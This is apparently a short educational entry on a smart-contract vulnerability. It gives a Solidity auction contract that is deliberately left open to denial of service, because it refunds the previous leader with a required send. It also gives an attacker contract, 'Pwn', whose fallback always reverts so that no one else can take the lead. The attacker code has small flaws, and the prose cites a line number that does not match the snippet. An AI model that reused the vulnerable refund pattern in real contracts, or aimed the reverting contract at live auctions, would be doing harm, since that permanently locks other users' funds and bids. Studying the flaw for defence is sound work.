## Call to the Unknown (DoS with unexpected revert)

```solidity
pragma solidity ^0.4.18;
// This Contract is Vulnerable for dods attack
contract CallToTheUnknown {
  // Highest bidder becomes the Leader. 
  // Vulnerable to DoS attack by an attacker contract which reverts all transactions to it.

    address currentLeader;
    uint highestBid;

    function() payable {
        require(msg.value > highestBid);
        require(currentLeader.send(highestBid)); // Refund the old leader, if it fails then revert, This will revert and it will fail becasue attacker contract have revert function in payable function
        currentLeader = msg.sender;
        highestBid = msg.value;
    }
}

contract Pwn {
  // call become leader 
  function becomeLeader(address _address, uint bidAmount) {
    _address.call.value(bidAmount);
  }
    
  // reverts anytime it receives ether, thus cancelling out the change of the leader and this will make the victim account under ddos attack
  function() payable {
    revert();
  }
}
```











## About the Contract 

In this case, an attacker’s contract could first claim leadership by sending enough ether to the insecure contract. Then, the transactions of another player who would attempt to claim leadership would throw due to line 25 in the above snippet.

Although a simple attack, this causes a permanent denial of service to the contract rendering it useless. This can be found in other ponzi scheme contracts that follow the same pattern.
